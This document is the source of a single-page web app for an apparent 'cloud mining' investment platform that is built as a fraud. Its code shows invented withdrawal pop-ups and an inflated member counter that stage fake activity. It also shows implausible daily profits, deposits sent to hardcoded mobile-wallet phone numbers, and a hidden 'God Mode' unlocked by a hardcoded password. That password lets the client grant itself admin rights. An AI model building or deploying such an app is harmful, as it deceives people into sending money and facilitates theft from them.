<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA ULTIMATE | God Mode Active</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap');
        body { font-family: 'Space Grotesk', sans-serif; background: #0f172a; color: #f8fafc; overflow-x: hidden; }
        .glass-dark { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.05); border-radius: 28px; }
        .neon-glow { box-shadow: 0 0 20px rgba(99, 102, 241, 0.3); }
        .bottom-nav { position: fixed; bottom: 20px; left: 15px; right: 15px; height: 75px; background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(15px); border-radius: 30px; display: flex; justify-content: space-around; align-items: center; z-index: 1000; border: 1px solid rgba(255,255,255,0.1); }
        .nav-btn { color: #64748b; font-size: 22px; transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); cursor: pointer; }
        .nav-btn.active { color: #818cf8; transform: translateY(-8px) scale(1.1); text-shadow: 0 0 10px #818cf8; }
        .status-pill { padding: 2px 8px; border-radius: 6px; font-size: 8px; font-weight: 800; text-transform: uppercase; }
        .pending { background: #f59e0b22; color: #fbbf24; }
        .approved { background: #10b98122; color: #34d399; }
        .rejected { background: #ef444422; color: #f87171; }
        ::-webkit-scrollbar { display: none; }
    </style>
</head>
<body class="pb-32">

    <!-- FAKE NOTIFICATION SYSTEM -->
    <div id="notif-box" class="fixed top-5 left-1/2 -translate-x-1/2 z-[10000] w-[90%] max-w-sm pointer-events-none"></div>

    <!-- STARTUP SCREEN -->
    <div id="auth-screen" class="fixed inset-0 bg-[#0f172a] z-[9999] flex flex-col items-center justify-center p-10">
        <div onclick="godModeTrigger()" class="w-24 h-24 bg-gradient-to-tr from-indigo-600 to-purple-600 rounded-[40px] flex items-center justify-center text-white text-4xl mb-8 animate-pulse shadow-[0_0_40px_rgba(79,70,229,0.4)]">
            <i class="fa-solid fa-microchip"></i>
        </div>
        <h1 class="text-4xl font-bold tracking-tighter mb-2">NEXA <span class="text-indigo-500 italic">ULTIMATE</span></h1>
        <p class="text-[10px] text-slate-500 tracking-[5px] uppercase mb-10">Neural Mining Network</p>
        <input type="text" id="user-name" placeholder="Enter Operator Name" class="w-full max-w-xs p-5 bg-slate-800/50 rounded-2xl border border-white/5 outline-none font-bold text-center focus:border-indigo-500 transition-all mb-4">
        <button onclick="initializeHub()" class="w-full max-w-xs bg-indigo-600 hover:bg-indigo-500 text-white p-5 rounded-2xl font-black uppercase text-xs tracking-widest transition-all">Connect to Mainframe</button>
    </div>

    <!-- APP WRAPPER -->
    <div id="app" class="hidden animate__animated animate__fadeIn">
        <!-- HEADER -->
        <header class="p-6 flex justify-between items-center sticky top-0 bg-[#0f172a]/80 backdrop-blur-lg z-50">
            <div>
                <p class="text-[10px] text-indigo-400 font-black uppercase tracking-widest">Operator</p>
                <h2 id="display-name" class="text-xl font-bold italic">--</h2>
            </div>
            <div class="flex gap-3">
                <button onclick="nav('admin')" id="god-btn" class="hidden w-12 h-12 glass-dark flex items-center justify-center text-red-500"><i class="fa-solid fa-eye"></i></button>
                <div class="w-12 h-12 glass-dark flex items-center justify-center text-indigo-400"><i class="fa-solid fa-bell"></i></div>
            </div>
        </header>

        <main class="px-6">
            <!-- PAGE: DASHBOARD -->
            <div id="page-home" class="page-content space-y-8">
                <!-- TOTAL BALANCE CARD -->
                <div class="glass-dark p-8 relative overflow-hidden neon-glow">
                    <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl"><i class="fa-solid fa-chart-line"></i></div>
                    <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mb-2">Portfolio Balance</p>
                    <h2 id="user-bal" class="text-5xl font-bold tracking-tighter mb-10">$0.00</h2>
                    <div class="flex gap-4">
                        <button onclick="nav('deposit')" class="flex-1 bg-indigo-600 p-4 rounded-2xl text-[10px] font-black uppercase tracking-wider">Add Funds</button>
                        <button onclick="nav('promo')" class="flex-1 glass-dark p-4 rounded-2xl text-[10px] font-black uppercase border-indigo-500/30">Redeem Code</button>
                    </div>
                </div>

                <!-- LIVE NETWORK STATS -->
                <div class="grid grid-cols-3 gap-4">
                    <div class="glass-dark p-4 text-center">
                        <p class="text-[8px] text-slate-500 uppercase font-black">Members</p>
                        <p id="stat-users" class="text-sm font-bold text-indigo-400">14,202</p>
                    </div>
                    <div class="glass-dark p-4 text-center">
                        <p class="text-[8px] text-slate-500 uppercase font-black">Payouts</p>
                        <p id="stat-payout" class="text-sm font-bold text-green-400">$82.4K</p>
                    </div>
                    <div class="glass-dark p-4 text-center">
                        <p class="text-[8px] text-slate-500 uppercase font-black">Uptime</p>
                        <p class="text-sm font-bold text-yellow-400">99.9%</p>
                    </div>
                </div>

                <!-- MINING PLANS -->
                <div>
                    <h3 class="text-xs font-black uppercase tracking-[3px] text-slate-500 mb-6 flex items-center gap-2">
                        <span class="w-2 h-2 bg-indigo-500 rounded-full animate-ping"></span> Active Nodes
                    </h3>
                    <div id="plans-grid" class="space-y-4"></div>
                </div>
            </div>

            <!-- PAGE: DEPOSIT -->
            <div id="page-deposit" class="page-content hidden">
                <h2 class="text-3xl font-bold italic mb-8">Deposit Hub</h2>
                <div class="space-y-4">
                    <div onclick="openPay('JazzCash','03705519562')" class="glass-dark p-6 flex items-center justify-between">
                        <div class="flex items-center gap-4">
                            <div class="w-12 h-12 bg-red-600 rounded-2xl flex items-center justify-center font-black">JC</div>
                            <div><p class="font-bold">JazzCash</p><p class="text-[10px] text-slate-500 italic">Instant processing</p></div>
                        </div>
                        <i class="fa-solid fa-chevron-right text-slate-600"></i>
                    </div>
                    <div onclick="openPay('Easypaisa','03379827882')" class="glass-dark p-6 flex items-center justify-between">
                        <div class="flex items-center gap-4">
                            <div class="w-12 h-12 bg-green-500 rounded-2xl flex items-center justify-center font-black">EP</div>
                            <div><p class="font-bold">Easypaisa</p><p class="text-[10px] text-slate-500 italic">Low fees</p></div>
                        </div>
                        <i class="fa-solid fa-chevron-right text-slate-600"></i>
                    </div>
                    <div onclick="openPay('SadaPay','03379827882')" class="glass-dark p-6 flex items-center justify-between">
                        <div class="flex items-center gap-4">
                            <div class="w-12 h-12 bg-teal-400 rounded-2xl flex items-center justify-center font-black">SP</div>
                            <div><p class="font-bold">SadaPay</p><p class="text-[10px] text-slate-500 italic">Direct transfer</p></div>
                        </div>
                        <i class="fa-solid fa-chevron-right text-slate-600"></i>
                    </div>
                </div>

                <!-- HISTORY SECTION -->
                <div class="mt-12">
                    <h3 class="text-xs font-black uppercase text-slate-500 mb-4 tracking-widest">Transaction History</h3>
                    <div id="user-history" class="space-y-2">
                        <p class="text-[10px] text-slate-600 text-center py-10 italic">No activity logs found yet...</p>
                    </div>
                </div>
            </div>

            <!-- PAGE: PROMOCODE -->
            <div id="page-promo" class="page-content hidden">
                <h2 class="text-3xl font-bold italic mb-4">Voucher</h2>
                <p class="text-xs text-slate-400 mb-10">Enter a manual code provided by Admin to get free credits.</p>
                <div class="glass-dark p-8 text-center space-y-6">
                    <i class="fa-solid fa-ticket text-5xl text-indigo-500 mb-4"></i>
                    <input type="text" id="promo-input" placeholder="CODE-XXXXX" class="w-full p-5 bg-slate-900 rounded-2xl border border-white/5 outline-none font-bold text-center tracking-widest uppercase">
                    <button onclick="applyPromo()" class="w-full bg-white text-black p-5 rounded-2xl font-black uppercase text-xs">Verify Voucher</button>
                </div>
            </div>

            <!-- PAGE: ABOUT & LEGAL -->
            <div id="page-legal" class="page-content hidden pb-10">
                <h2 class="text-3xl font-bold italic mb-8">Ecosystem</h2>
                <div class="space-y-4">
                    <details class="glass-dark p-5">
                        <summary class="font-bold text-sm">What is Nexa Ultimate?</summary>
                        <p class="text-xs text-slate-400 mt-4 leading-relaxed">Nexa Ultimate is a decentralized cloud mining platform allowing users to lease neural processing power for high-yield returns.</p>
                    </details>
                    <details class="glass-dark p-5">
                        <summary class="font-bold text-sm">How to Withdraw?</summary>
                        <p class="text-xs text-slate-400 mt-4 leading-relaxed">Minimum withdrawal is $10. Requests are processed within 24-48 hours via your preferred gateway.</p>
                    </details>
                    <details class="glass-dark p-5">
                        <summary class="font-bold text-sm">Privacy Policy</summary>
                        <p class="text-xs text-slate-400 mt-4 leading-relaxed">We use end-to-end encryption for all transactions. Your data is never shared with third parties.</p>
                    </details>
                </div>
            </div>

            <!-- PAGE: GOD MODE (ADMIN) -->
            <div id="page-admin" class="page-content hidden">
                <div class="flex justify-between items-center mb-8">
                    <h2 class="text-3xl font-black italic text-red-500 uppercase">God Mode</h2>
                    <button onclick="nav('home')" class="w-10 h-10 glass-dark flex items-center justify-center"><i class="fa-solid fa-xmark"></i></button>
                </div>

                <!-- ADMIN: ALL USERS (GOD CONTROL) -->
                <div class="mb-10">
                    <h3 class="text-[10px] font-black uppercase text-slate-500 mb-4 tracking-[4px]">User Management</h3>
                    <div id="god-users-list" class="space-y-3"></div>
                </div>

                <!-- ADMIN: PROMO CREATOR -->
                <div class="mb-10 glass-dark p-6 border-indigo-500/20">
                    <h3 class="text-[10px] font-black uppercase text-indigo-400 mb-4">Create Promo Code</h3>
                    <div class="flex gap-2">
                        <input type="text" id="new-code" placeholder="CODE" class="flex-1 p-3 bg-slate-900 rounded-xl text-xs font-bold outline-none">
                        <input type="number" id="new-code-val" placeholder="Value ($)" class="w-20 p-3 bg-slate-900 rounded-xl text-xs font-bold outline-none">
                        <button onclick="createCode()" class="bg-indigo-600 px-4 rounded-xl text-[10px] font-black uppercase">Add</button>
                    </div>
                </div>

                <!-- ADMIN: DEPOSIT REQUESTS -->
                <div>
                    <h3 class="text-[10px] font-black uppercase text-slate-500 mb-4 tracking-[4px]">Validation Queue</h3>
                    <div id="god-dep-list" class="space-y-4"></div>
                </div>
            </div>
        </main>

        <!-- NAVIGATION -->
        <nav class="bottom-nav">
            <div onclick="nav('home')" id="nav-home" class="nav-btn active"><i class="fa-solid fa-house-chimney-window"></i></div>
            <div onclick="nav('deposit')" id="nav-deposit" class="nav-btn"><i class="fa-solid fa-wallet"></i></div>
            <div onclick="nav('legal')" id="nav-legal" class="nav-btn"><i class="fa-solid fa-shield-halved"></i></div>
            <div onclick="nav('promo')" id="nav-promo" class="nav-btn"><i class="fa-solid fa-ticket"></i></div>
        </nav>
    </div>

    <!-- PAYMENT MODAL -->
    <div id="pay-modal" class="fixed inset-0 bg-black/90 z-[9999] hidden flex items-center justify-center p-6 backdrop-blur-xl">
        <div class="glass-dark p-8 bg-slate-900/80 w-full max-w-sm animate__animated animate__backInUp border-indigo-500/20">
            <h3 id="gw-name" class="text-2xl font-black italic mb-2">...</h3>
            <div class="bg-indigo-900/30 p-5 rounded-2xl mb-8 flex justify-between items-center border border-indigo-500/10">
                <span id="gw-num" class="font-black text-indigo-400 text-lg tracking-widest">0000000000</span>
                <i onclick="copyNum()" class="fa-solid fa-copy text-indigo-200 active:scale-75 transition-all"></i>
            </div>
            <div class="space-y-4">
                <input type="number" id="pay-amt" placeholder="Deposit Amount ($)" class="w-full p-5 bg-slate-950 rounded-2xl font-bold outline-none border border-white/5 focus:border-indigo-500">
                <input type="text" id="pay-tid" placeholder="Transaction ID (TID)" class="w-full p-5 bg-slate-950 rounded-2xl font-bold outline-none border border-white/5 focus:border-indigo-500">
                <button onclick="submitProof()" class="w-full bg-indigo-600 text-white p-5 rounded-2xl font-black uppercase text-xs shadow-xl shadow-indigo-500/20">Authorize Transfer</button>
                <button onclick="closePay()" class="w-full text-slate-500 text-[9px] font-black uppercase tracking-widest">Cancel Session</button>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, update, push, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

        // CONFIG (Replace with your actual keys)
        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);

        let userObj = null;
        let userUID = "";

        // --- AUTH LOGIC ---
        window.initializeHub = async () => {
            const name = document.getElementById('user-name').value;
            if(!name) return alert("Sweetie, enter your name first!");
            const res = await signInAnonymously(auth);
            userUID = res.user.uid;
            const userRef = ref(db, `users/${userUID}`);
            const snapshot = await get(userRef);
            if(!snapshot.exists()) {
                await set(userRef, { username: name, balance: 0, role: 'user', joined: Date.now() });
            }
            location.reload();
        };

        onAuthStateChanged(auth, u => {
            if(u) {
                userUID = u.uid;
                onValue(ref(db, `users/${u.uid}`), snap => {
                    userObj = snap.val();
                    document.getElementById('display-name').innerText = userObj.username;
                    document.getElementById('user-bal').innerText = `$${(userObj.balance || 0).toFixed(2)}`;
                    if(userObj.role === 'admin') {
                        document.getElementById('god-btn').classList.remove('hidden');
                        loadAdminCore();
                    }
                });
                loadHistory();
                loadPlans();
                startFakeSystem();
                document.getElementById('auth-screen').classList.add('hidden');
                document.getElementById('app').classList.remove('hidden');
            }
        });

        // --- NAVIGATION ---
        window.nav = (id) => {
            document.querySelectorAll('.page-content').forEach(p => p.classList.add('hidden'));
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(`page-${id}`).classList.remove('hidden');
            if(document.getElementById(`nav-${id}`)) document.getElementById(`nav-${id}`).classList.add('active');
            window.scrollTo(0,0);
        };

        // --- PLANS ---
        const plans = [
            { id: 1, name: "Neural Spark", price: 15, daily: 1.2, days: 30, color: "indigo" },
            { id: 2, name: "Core Reactor", price: 60, daily: 5.5, days: 30, color: "purple" },
            { id: 3, name: "Void Miner", price: 150, daily: 15, days: 30, color: "emerald" },
            { id: 4, name: "Overlord Node", price: 1000, daily: 120, days: 30, color: "rose" }
        ];

        function loadPlans() {
            const con = document.getElementById('plans-grid');
            con.innerHTML = plans.map(p => `
                <div class="glass-dark p-6 relative group active:scale-[0.98] transition-all">
                    <div class="flex justify-between items-start mb-6">
                        <div>
                            <h4 class="text-xl font-bold tracking-tight">${p.name}</h4>
                            <p class="text-[9px] font-black text-${p.color}-400 uppercase">Premium Mining Hub</p>
                        </div>
                        <div class="text-right">
                            <p class="text-[8px] text-slate-500 uppercase font-black">Daily Profit</p>
                            <p class="text-sm font-bold text-green-400">$${p.daily}</p>
                        </div>
                    </div>
                    <div class="flex items-end justify-between">
                        <div>
                            <p class="text-[8px] text-slate-500 uppercase font-black">Node Price</p>
                            <p class="text-xl font-black italic">$${p.price}</p>
                        </div>
                        <button onclick="buyPlan(${p.id}, ${p.price})" class="bg-${p.color}-600/20 text-${p.color}-400 px-6 py-3 rounded-xl text-[10px] font-black uppercase border border-${p.color}-500/30">Activate</button>
                    </div>
                </div>
            `).join('');
        }

        // --- DEPOSIT SYSTEM ---
        window.openPay = (name, num) => {
            document.getElementById('gw-name').innerText = name;
            document.getElementById('gw-num').innerText = num;
            document.getElementById('pay-modal').classList.remove('hidden');
        };
        window.closePay = () => document.getElementById('pay-modal').classList.add('hidden');

        window.submitProof = async () => {
            const amt = parseFloat(document.getElementById('pay-amt').value);
            const tid = document.getElementById('pay-tid').value;
            if(!amt || !tid) return alert("Sweetie, fill everything!");

            const depRef = push(ref(db, 'deposits'));
            await set(depRef, {
                id: depRef.key,
                uid: userUID,
                username: userObj.username,
                amount: amt,
                tid: tid,
                method: document.getElementById('gw-name').innerText,
                status: 'pending',
                time: Date.now()
            });
            alert("Sent to Hub! Validation in progress... ⏳");
            closePay();
        };

        function loadHistory() {
            onValue(ref(db, 'deposits'), snap => {
                const con = document.getElementById('user-history'); con.innerHTML = "";
                let count = 0;
                snap.forEach(child => {
                    const d = child.val();
                    if(d.uid === userUID) {
                        count++;
                        con.innerHTML += `
                            <div class="glass-dark p-4 flex justify-between items-center border-l-4 ${d.status === 'pending' ? 'border-yellow-500' : d.status === 'approved' ? 'border-green-500' : 'border-red-500'}">
                                <div><p class="text-[10px] font-bold">${d.method} Deposit</p><p class="text-[8px] text-slate-500">${new Date(d.time).toLocaleDateString()}</p></div>
                                <div class="text-right">
                                    <p class="font-bold text-xs">$${d.amount}</p>
                                    <span class="status-pill ${d.status}">${d.status}</span>
                                </div>
                            </div>`;
                    }
                });
                if(count === 0) con.innerHTML = `<p class="text-[10px] text-slate-600 text-center py-10 italic">No activity logs found yet...</p>`;
            });
        }

        // --- PROMO CODE SYSTEM ---
        window.applyPromo = async () => {
            const input = document.getElementById('promo-input').value.trim().toUpperCase();
            if(!input) return;
            const snap = await get(ref(db, `promocodes/${input}`));
            if(snap.exists()) {
                const val = snap.val().amount;
                await update(ref(db, `users/${userUID}`), { balance: userObj.balance + val });
                await remove(ref(db, `promocodes/${input}`)); // One time use
                alert(`Sweetie! $${val} added to your account! 🎁`);
                document.getElementById('promo-input').value = "";
            } else {
                alert("Invalid or Expired Code!");
            }
        };

        // --- GOD MODE (ADMIN CORE) ---
        function loadAdminCore() {
            // Users Control
            onValue(ref(db, 'users'), snap => {
                const con = document.getElementById('god-users-list'); con.innerHTML = "";
                snap.forEach(child => {
                    const u = child.val();
                    con.innerHTML += `
                        <div class="glass-dark p-4 flex justify-between items-center">
                            <div><p class="text-xs font-bold italic">${u.username}</p><p class="text-[10px] text-indigo-400 font-bold">$${u.balance.toFixed(2)}</p></div>
                            <div class="flex gap-2">
                                <button onclick="manualEdit('${child.key}', 10)" class="w-8 h-8 bg-green-500/20 text-green-500 rounded-lg text-[10px] font-bold">+$10</button>
                                <button onclick="manualEdit('${child.key}', -10)" class="w-8 h-8 bg-red-500/20 text-red-500 rounded-lg text-[10px] font-bold">-$10</button>
                            </div>
                        </div>`;
                });
            });

            // Deposits Validation
            onValue(ref(db, 'deposits'), snap => {
                const con = document.getElementById('god-dep-list'); con.innerHTML = "";
                snap.forEach(child => {
                    const d = child.val();
                    if(d.status === 'pending') {
                        con.innerHTML += `
                            <div class="glass-dark p-5 border-l-4 border-yellow-500">
                                <div class="flex justify-between mb-4">
                                    <span class="text-[9px] font-black text-indigo-400 uppercase">${d.method} | TID: ${d.tid}</span>
                                    <span class="text-[9px] text-slate-500 italic">${d.username}</span>
                                </div>
                                <h4 class="text-xl font-bold mb-6 italic">Amount: $${d.amount}</h4>
                                <div class="flex gap-3">
                                    <button onclick="updateStatus('${child.key}', '${d.uid}', ${d.amount}, 'approved')" class="flex-1 bg-green-600 py-3 rounded-xl text-[10px] font-black uppercase">Approve</button>
                                    <button onclick="updateStatus('${child.key}', '${d.uid}', ${d.amount}, 'rejected')" class="flex-1 bg-red-600/20 text-red-500 py-3 rounded-xl text-[10px] font-black uppercase">Reject</button>
                                </div>
                            </div>`;
                    }
                });
            });
        }

        window.manualEdit = async (uid, val) => {
            const snap = await get(ref(db, `users/${uid}/balance`));
            await update(ref(db, `users/${uid}`), { balance: (snap.val() || 0) + val });
        };

        window.createCode = async () => {
            const code = document.getElementById('new-code').value.toUpperCase();
            const val = parseFloat(document.getElementById('new-code-val').value);
            if(code && val) {
                await set(ref(db, `promocodes/${code}`), { amount: val });
                alert("Code Activated!");
                document.getElementById('new-code').value = "";
                document.getElementById('new-code-val').value = "";
            }
        };

        window.updateStatus = async (key, uid, amt, status) => {
            if(status === 'approved') {
                const uSnap = await get(ref(db, `users/${uid}/balance`));
                await update(ref(db, `users/${uid}`), { balance: (uSnap.val() || 0) + amt });
            }
            await update(ref(db, `deposits/${key}`), { status: status });
            alert(`Transfer ${status}!`);
        };

        // --- UTILS ---
        window.copyNum = () => {
            const n = document.getElementById('gw-num').innerText;
            navigator.clipboard.writeText(n);
            alert("Number Copied!");
        };

        let taps = 0;
        window.godModeTrigger = () => {
            taps++;
            if(taps === 5) {
                const p = prompt("ACCESS CODE:");
                if(p === "sweetie786") {
                    update(ref(db, `users/${userUID}`), { role: 'admin' });
                    alert("God Mode Unlocked. Welcome back, Admin.");
                    location.reload();
                }
                taps = 0;
            }
        };

        function startFakeSystem() {
            const names = ["Ahmad", "Zain", "Sana", "Isha", "Musa", "Eshaal", "Kashan", "Warda"];
            setInterval(() => {
                const n = names[Math.floor(Math.random()*names.length)];
                const a = Math.floor(Math.random()*100) + 20;
                const box = document.getElementById('notif-box');
                const d = document.createElement('div');
                d.className = "glass-dark p-4 mb-2 flex items-center gap-3 animate__animated animate__fadeInDown bg-indigo-900/40 border-indigo-500/30";
                d.innerHTML = `<div class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-[10px]"><i class="fa-solid fa-check"></i></div>
                               <p class="text-[10px] font-bold">${n} just withdrew $${a}.00</p>`;
                box.appendChild(d);
                setTimeout(() => { d.classList.replace('animate__fadeInDown', 'animate__fadeOutUp'); setTimeout(() => d.remove(), 1000); }, 4000);
                
                // Live Stats Increase
                document.getElementById('stat-users').innerText = (parseInt(document.getElementById('stat-users').innerText.replace(',','')) + 1).toLocaleString();
            }, 7000);
        }

    </script>
</body>
</html>
